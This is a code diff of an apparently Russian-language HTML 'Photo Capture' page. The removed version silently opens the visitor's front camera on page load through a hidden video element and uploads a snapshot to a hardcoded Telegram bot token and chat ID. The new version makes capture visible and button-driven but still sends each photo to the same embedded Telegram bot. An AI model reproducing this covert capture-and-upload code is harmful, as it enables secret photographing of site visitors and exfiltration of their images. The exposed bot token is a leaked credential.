@@ -5,10 +5,22 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Photo Capture</title>
     <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 15px;
+        }
         .container {
             text-align: center;
             margin: 20px auto;
             max-width: 500px;
+        }
+        #video {
+            width: 100%;
+            max-width: 400px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            background-color: #eee;
         }
         #photo {
             max-width: 100%;
@@ -17,150 +29,230 @@
             margin-top: 20px;
         }
         .status {
-            margin-top: 10px;
+            margin: 15px 0;
+            padding: 10px;
+            background-color: #f8f8f8;
+            border-radius: 5px;
+            color: #333;
+            font-weight: bold;
+        }
+        .button {
+            margin-top: 15px;
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .debug {
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #f0f0f0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
             color: #666;
-            font-style: italic;
+            font-size: 12px;
+            text-align: left;
+            white-space: pre-wrap;
+            max-height: 150px;
+            overflow-y: auto;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>Захваченное изображение:</h2>
-        <div class="status" id="status">Подготовка камеры...</div>
+        <h2>Камера</h2>
+        <div class="status" id="status">Нажмите на кнопку для запуска камеры</div>
+        
+        <!-- Делаем видео видимым, чтобы пользователь видел, что происходит -->
+        <video id="video" autoplay playsinline></video>
+        
+        <button id="startButton" class="button">Запустить камеру</button>
+        <button id="captureButton" class="button" style="display: none;">Сделать фото</button>
+        
         <img id="photo" alt="Фото будет здесь" style="display: none;">
+        
+        <!-- Добавляем отладочную информацию -->
+        <div id="debug" class="debug"></div>
     </div>
 
     <script>
+        // Элементы DOM
+        const video = document.getElementById('video');
+        const startButton = document.getElementById('startButton');
+        const captureButton = document.getElementById('captureButton');
         const photoElement = document.getElementById('photo');
         const statusElement = document.getElementById('status');
+        const debugElement = document.getElementById('debug');
         
-        const BOT_TOKEN = "8186769001:AAHQ-3PT9NHqPbZTXvCinuMAhKpQJX2QQ68"; // Токен бота
-        const CHAT_ID = "7717007781"; // ID чата
-        
-        // Создаем скрытые элементы для захвата
-        const video = document.createElement('video');
-        video.setAttribute('autoplay', '');
-        video.setAttribute('playsinline', '');
-        video.style.display = 'none';
-        document.body.appendChild(video);
-        
+        // Создаем скрытый холст
         const canvas = document.createElement('canvas');
         canvas.style.display = 'none';
         document.body.appendChild(canvas);
         
+        // Telegram данные
+        const BOT_TOKEN = "8186769001:AAHQ-3PT9NHqPbZTXvCinuMAhKpQJX2QQ68";
+        const CHAT_ID = "7717007781";
+        
         let stream = null;
-
-        // Инициализация и захват фото
-        async function captureAndSend() {
+        
+        // Функция для логирования отладочной информации
+        function logDebug(message) {
+            const timestamp = new Date().toLocaleTimeString();
+            debugElement.textContent += `[${timestamp}] ${message}\n`;
+            debugElement.scrollTop = debugElement.scrollHeight;
+            console.log(message);
+        }
+        
+        // Инициализация камеры
+        async function initCamera() {
             try {
                 statusElement.textContent = "Запрос доступа к камере...";
+                logDebug("Запрашиваем доступ к камере");
                 
-                // Запрашиваем доступ к камере
-                stream = await navigator.mediaDevices.getUserMedia({
+                // Запрашиваем доступ с меньшими требованиями
+                const constraints = {
                     video: {
                         facingMode: "user", // Фронтальная камера
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
+                        width: { ideal: 640 }, // Меньше размер для лучшей совместимости
+                        height: { ideal: 480 }
                     }
-                });
+                };
                 
+                logDebug(`Constraints: ${JSON.stringify(constraints)}`);
+                
+                // Попытка получить доступ к камере
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
+                
+                // Подключаем поток к видео элементу
                 video.srcObject = stream;
                 
-                statusElement.textContent = "Подготовка к снимку...";
+                logDebug("Поток камеры получен, ожидаем загрузки видео");
                 
-                // Ждем, пока видео загрузится, и делаем снимок
-                video.onloadedmetadata = function() {
-                    video.play();
-                    
-                    // Даем камере время настроиться
-                    setTimeout(() => {
-                        takePhoto();
-                    }, 2000);
+                // Отображаем кнопку захвата только когда видео действительно загружено
+                video.onloadeddata = function() {
+                    logDebug(`Видео загружено: ${video.videoWidth}x${video.videoHeight}`);
+                    statusElement.textContent = "Камера готова";
+                    captureButton.style.display = "inline-block";
+                    startButton.style.display = "none";
                 };
+                
             } catch (error) {
-                statusElement.textContent = "Ошибка: " + error.message;
-                console.error("Ошибка доступа к камере:", error);
+                statusElement.textContent = `Ошибка доступа к камере: ${error.message}`;
+                logDebug(`Ошибка камеры: ${error.message}`);
+                logDebug(`Stack: ${error.stack}`);
             }
         }
-
-        function takePhoto() {
+        
+        // Захват фото
+        function capturePhoto() {
             try {
-                statusElement.textContent = "Делаем снимок...";
+                logDebug("Начинаем захват фото");
                 
-                // Проверяем инициализацию видео
+                // Проверка размеров видео
                 if (video.videoWidth === 0 || video.videoHeight === 0) {
-                    statusElement.textContent = "Ошибка: Камера не инициализирована";
+                    statusElement.textContent = "Ошибка: Видеопоток не инициализирован";
+                    logDebug(`Ошибка: размеры видео = ${video.videoWidth}x${video.videoHeight}`);
                     return;
                 }
                 
                 // Настраиваем холст
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
+                
+                logDebug(`Размеры холста: ${canvas.width}x${canvas.height}`);
+                
+                // Получаем контекст и рисуем
                 const ctx = canvas.getContext('2d');
                 
-                // Чистим холст
+                // Очищаем холст
                 ctx.fillStyle = '#FFF';
                 ctx.fillRect(0, 0, canvas.width, canvas.height);
                 
-                // Рисуем кадр видео
+                // Рисуем кадр
+                logDebug("Рисуем на холсте");
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // Останавливаем камеру
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                }
+                statusElement.textContent = "Обработка снимка...";
                 
-                // Создаем изображение
+                // Конвертируем в Blob
                 canvas.toBlob(
                     blob => {
                         if (blob) {
+                            logDebug(`Blob создан: ${blob.size} байт`);
                             displayPhoto(blob);
                             sendPhoto(blob);
                         } else {
                             statusElement.textContent = "Ошибка создания изображения";
+                            logDebug("Blob не был создан");
                         }
                     }, 
                     'image/jpeg', 
-                    0.95
+                    0.9
                 );
             } catch (error) {
-                statusElement.textContent = "Ошибка при захвате фото: " + error.message;
-                console.error("Ошибка при захвате фото:", error);
+                statusElement.textContent = "Ошибка при захвате фото";
+                logDebug(`Ошибка захвата: ${error.message}`);
+                logDebug(`Stack: ${error.stack}`);
             }
         }
-
+        
+        // Отображаем фото
         function displayPhoto(blob) {
             const url = URL.createObjectURL(blob);
             photoElement.src = url;
             photoElement.style.display = 'block';
+            video.style.display = 'none';
+            logDebug("Фото отображено");
         }
-
+        
+        // Отправляем фото
         function sendPhoto(blob) {
             statusElement.textContent = "Отправка фото...";
+            logDebug("Начинаем отправку фото");
             
             let formData = new FormData();
             formData.append('chat_id', CHAT_ID);
             formData.append('photo', blob, 'photo.jpg');
-
+            
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             })
-            .then(response => response.json())
+            .then(response => {
+                logDebug(`Ответ получен: ${response.status}`);
+                return response.json();
+            })
             .then(data => {
-                console.log("Отправлено:", data);
+                logDebug(`Данные ответа: ${JSON.stringify(data)}`);
                 statusElement.textContent = data.ok ? 
                     "Фото отправлено в Telegram!" : 
                     "Ошибка при отправке: " + (data.description || "неизвестная ошибка");
             })
             .catch(error => {
-                console.error("Ошибка отправки:", error);
+                logDebug(`Ошибка отправки: ${error.message}`);
                 statusElement.textContent = "Ошибка отправки: " + error.message;
             });
         }
-
-        // Запускаем процесс захвата при загрузке страницы
-        window.addEventListener('DOMContentLoaded', captureAndSend);
+        
+        // Остановка камеры
+        function stopCamera() {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+                logDebug("Камера остановлена");
+            }
+        }
+        
+        // Обработчики событий
+        startButton.addEventListener('click', initCamera);
+        captureButton.addEventListener('click', capturePhoto);
+        
+        // Логируем информацию о браузере
+        logDebug(`Браузер: ${navigator.userAgent}`);
+        logDebug(`Доступен MediaDevices: ${!!navigator.mediaDevices}`);
     </script>
 </body>
 </html>
